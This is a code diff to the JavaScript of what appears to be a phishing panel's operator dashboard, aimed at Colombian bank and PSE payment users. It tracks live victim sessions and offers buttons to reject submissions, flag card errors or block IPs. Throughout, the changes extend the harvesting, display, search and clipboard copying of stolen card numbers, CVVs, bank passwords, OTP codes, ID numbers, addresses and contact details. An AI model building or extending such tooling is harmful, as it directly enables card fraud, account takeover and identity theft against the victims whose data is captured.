@@ -419,7 +419,6 @@ function botonesSesion(s) {
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
         btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
         btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Ver Información del Usuario" onclick="verInfoUsuario('${sid}')">👁️</button>`);
-        // 📡 Boton de estado eliminado según solicitud
         btns.push(`<button class="btn btn-block" title="Bloquear y Expulsar IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         return btns.join('');
     }
@@ -476,10 +475,11 @@ function renderSesiones() {
             const datos = s.datos || {};
             const texto = [
                 datos.bancoKey, s.estado, datos.identificacion, datos.clave,
-                datos.docNumber, datos.tarjeta, datos.titular, datos.token,
+                datos.docNumber, datos.documento, datos.tarjeta, datos.titular, datos.token,
                 datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
                 datos.cvv, datos.marca, datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName,
-                datos.empresa, datos.cuenta, datos.medioPago
+                datos.empresa, datos.cuenta, datos.medioPago, datos.nombres, datos.apellidos,
+                datos.telefono, datos.celular, datos.correo, datos.direccion, datos.rol
             ].filter(Boolean).join(' ').toLowerCase();
             return texto.includes(filtro);
         });
@@ -512,7 +512,7 @@ function renderSesiones() {
             identificacionTrj = datos.tarjeta || datos.cuenta || '-';
             claveFch = datos.expMes || datos.expAnio ? `${datos.expMes || ''}/${datos.expAnio || ''}` : (datos.empresa || '-');
             cvv = datos.cvv || datos.medioPago || '-';
-            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+            documento = datos.docNumber || datos.documento ? `${datos.docType || datos.tipoDoc || 'CC'} ${datos.docNumber || datos.documento}` : '-';
         } else if (esTarjeta) {
             identificacionTrj = datos.tarjeta || datos.identificacion || '-';
             const mes = datos.expMes || datos.exp || '';
@@ -527,7 +527,7 @@ function renderSesiones() {
             documento = '-';
         }
 
-        const titular = datos.titular || '-';
+        const titular = datos.titular || datos.nombres || '-';
         const token = datos.token || '-';
         const otp = datos.otp || datos.claveDinamica || '-';
         const montoValor = datos.monto || (s.estado === 'precio_asignado' ? s.accion : null);
@@ -535,7 +535,6 @@ function renderSesiones() {
         const ip = datos.ip || '-';
         const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
 
-        // Lógica del Semáforo Heartbeat (Verde <= 10s, Amarillo 10s - 30s, Rojo > 30s)
         let colorPunto = '#ef4444';
         let tituloPunto = 'Desconectado';
         const activoInfo = activosCache.find(a => a.sessionId === s.sessionId);
@@ -546,13 +545,13 @@ function renderSesiones() {
             const segundosInactivo = (ahora - ultimoHeartbeat) / 1000;
             
             if (segundosInactivo <= 10) {
-                colorPunto = '#22c55e'; // Verde
+                colorPunto = '#22c55e';
                 tituloPunto = 'Activo (' + Math.floor(segundosInactivo) + 's)';
             } else if (segundosInactivo > 10 && segundosInactivo <= 30) {
-                colorPunto = '#fbbf24'; // Amarillo
+                colorPunto = '#fbbf24';
                 tituloPunto = 'Inactivo (' + Math.floor(segundosInactivo) + 's)';
             } else {
-                colorPunto = '#ef4444'; // Rojo
+                colorPunto = '#ef4444';
                 tituloPunto = 'Desconectado';
             }
         }
@@ -613,7 +612,7 @@ function copiarDatos(id) {
     const h = historialCache.find(x => x.id === id);
     if (!h) return;
     const d = h.datos || {};
-    const texto = `Tarjeta: ${d.tarjeta || '-'}\nVencimiento: ${d.expMes || ''}/${d.expAnio || ''}\nCVV: ${d.cvv || '-'}\nTitular: ${d.titular || '-'}\nDocumento: ${d.docType || ''} ${d.docNumber || ''}\nOTP: ${d.otp || 'Sin OTP'}\nMonto: ${d.monto || '-'}\nIP: ${d.ip || '-'}`;
+    const texto = `Nombres: ${d.nombres || '-'}\nApellidos: ${d.apellidos || '-'}\nDocumento: ${d.docType || d.tipoDoc || ''} ${d.docNumber || d.documento || ''}\nCelular: ${d.telefono || d.celular || '-'}\nCorreo: ${d.correo || '-'}\nDirección: ${d.direccion || '-'}\nRol: ${d.rol || '-'}\nTarjeta: ${d.tarjeta || '-'}\nVencimiento: ${d.expMes || ''}/${d.expAnio || ''}\nCVV: ${d.cvv || '-'}\nTitular: ${d.titular || '-'}\nOTP: ${d.otp || 'Sin OTP'}\nMonto: ${d.monto || '-'}\nIP: ${d.ip || '-'}`;
     
     navigator.clipboard.writeText(texto).then(function() {
         toast('📋 Datos copiados al portapapeles');
@@ -627,7 +626,7 @@ function renderHistorial() {
     const tbody = $('tbodyHistorial');
     let lista = historialCache;
     if (filtro) {
-        lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
+        lista = lista.filter(h => { const datos = h.datos || {}; const texto = [ h.bancoKey, datos.titular, datos.nombres, datos.apellidos, datos.docNumber, datos.documento, datos.tarjeta, datos.identificacion, datos.token, datos.otp, datos.ip, datos.telefono, datos.celular, datos.correo, datos.direccion, datos.rol, datos.cardBrand, datos.bankName ].filter(Boolean).join(' ').toLowerCase(); return texto.includes(filtro); });
     }
     if (!lista.length) { tbody.innerHTML = '<tr><td colspan="7" class="empty">Sin registros en el historial</td></tr>'; actualizarBtnBorrarHistorial(); return; }
     
@@ -640,12 +639,14 @@ function renderHistorial() {
         const exp = (datos.expMes || datos.expAnio || datos.exp) ? `${datos.expMes || ''}/${datos.expAnio || datos.exp || ''}` : '-';
         const cvv = datos.cvv || '-';
         const tipoPersona = datos.tipoPersona || '-';
-        const tipoDoc = datos.docType || datos.tipoDocumento || '-';
+        const tipoDoc = datos.docType || datos.tipoDocumento || datos.tipoDoc || '-';
         const numDoc = datos.documento || datos.docNumber || '-';
         const nombres = datos.nombres || datos.titular || '-';
         const apellidos = datos.apellidos || '';
-        const telefono = datos.telefono || '-';
+        const telefono = datos.telefono || datos.celular || '-';
         const correo = datos.correo || '-';
+        const direccion = datos.direccion || '-';
+        const rol = datos.rol || '-';
         const placa = datos.placa || '-';
         const monto = (datos.monto || datos.precio) ? '$' + Number(datos.monto || datos.precio).toLocaleString('es-CO') : '-';
         const bancoEmisor = datos.bankName || '-';
@@ -679,7 +680,9 @@ function renderHistorial() {
                             <div class="detalle-item"><span class="lbl">Apellidos</span><span class="val">${escapeHtml(apellidos)}</span></div>
                             <div class="detalle-item"><span class="lbl">Teléfono</span><span class="val">${escapeHtml(telefono)}</span></div>
                             <div class="detalle-item"><span class="lbl">Correo</span><span class="val">${escapeHtml(correo)}</span></div>
-                            <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(placa.toUpperCase())}</span></div>
+                            <div class="detalle-item"><span class="lbl">Dirección</span><span class="val">${escapeHtml(direccion)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Rol</span><span class="val">${escapeHtml(rol)}</span></div>
+                            <div class="detalle-item"><span class="lbl">Placa</span><span class="val">${escapeHtml(String(placa).toUpperCase())}</span></div>
                             <div class="detalle-item"><span class="lbl">Monto</span><span class="val">${escapeHtml(monto)}</span></div>
                             <div class="detalle-item"><span class="lbl">OTP</span><span class="val" style="color:#a855f7;">${escapeHtml(otp)}</span></div>
                             
@@ -759,31 +762,52 @@ function verInfoUsuario(sessionId) {
     const s = sesionesCache.find(x => x.sessionId === sessionId);
     if (!s) return;
     const d = s.datos || {};
-    
+
+    const tieneDatosPSE = d.nombres || d.documento || d.docNumber || d.telefono || d.celular || d.correo || d.direccion || d.rol;
+
     Swal.fire({
         title: '👤 Información del Usuario',
         html: `
-            <div style="text-align: left; font-size: 13px; line-height: 1.6;">
+            <div style="text-align: left; font-size: 13px; line-height: 1.7;">
                 <p><b>IP:</b> ${escapeHtml(d.ip || '-')}</p>
                 <p><b>Empresa:</b> ${escapeHtml(d.empresa || '-')}</p>
                 <p><b>Cuenta/Referencia:</b> ${escapeHtml(d.cuenta || '-')}</p>
-                <hr style="border-color:#252d44;">
-                <p><b>Tarjeta:</b> ${escapeHtml(d.tarjeta || '-')}</p>
+                <p><b>Medio de Pago:</b> ${escapeHtml(d.medioPago || '-')}</p>
+
+                ${tieneDatosPSE ? `
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">📋 Datos PSE</div>
+                <p><b>Tipo Documento:</b> ${escapeHtml(d.tipoDoc || d.docType || '-')}</p>
+                <p><b>Documento:</b> ${escapeHtml(d.documento || d.docNumber || '-')}</p>
+                <p><b>Nombres:</b> ${escapeHtml(d.nombres || '-')}</p>
+                <p><b>Apellidos:</b> ${escapeHtml(d.apellidos || '-')}</p>
+                <p><b>Celular:</b> ${escapeHtml(d.telefono || d.celular || '-')}</p>
+                <p><b>Correo:</b> ${escapeHtml(d.correo || '-')}</p>
+                <p><b>Dirección:</b> ${escapeHtml(d.direccion || '-')}</p>
+                <p><b>Rol:</b> ${escapeHtml(d.rol || '-')}</p>
+                ` : ''}
+
+                ${d.tarjeta ? `
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <div style="color:#88f456; font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.5px; margin-bottom:8px;">💳 Datos Tarjeta</div>
+                <p><b>Tarjeta:</b> ${escapeHtml(d.tarjeta)}</p>
                 <p><b>Vencimiento:</b> ${escapeHtml(d.expMes || '-')}/${escapeHtml(d.expAnio || '-')}</p>
                 <p><b>CVV:</b> ${escapeHtml(d.cvv || '-')}</p>
                 <p><b>Titular:</b> ${escapeHtml(d.titular || '-')}</p>
-                <p><b>Documento:</b> ${escapeHtml(d.docType || '')} ${escapeHtml(d.docNumber || '')}</p>
-                <hr style="border-color:#252d44;">
-                <p><b>OTP:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || '-')}</span></p>
-                <p><b>Monto:</b> $${Number(d.monto || 0).toLocaleString('es-CO')}</p>
                 <p><b>Banco Emisor:</b> ${escapeHtml(d.bankName || '-')}</p>
                 <p><b>Nivel:</b> ${escapeHtml(d.cardLevel || '-')}</p>
+                ` : ''}
+
+                <hr style="border-color:#252d44; margin: 10px 0;">
+                <p><b>OTP:</b> <span style="color:#a855f7; font-weight:bold;">${escapeHtml(d.otp || '-')}</span></p>
+                <p><b>Monto:</b> $${Number(d.monto || d.precio || 0).toLocaleString('es-CO')}</p>
             </div>
         `,
         confirmButtonColor: '#88f456',
         confirmButtonText: 'Cerrar',
         background: '#151b2e',
-        color: '#e5e7eb'
+        color: '#e5e7eb',
+        width: 500
     });
 }
 
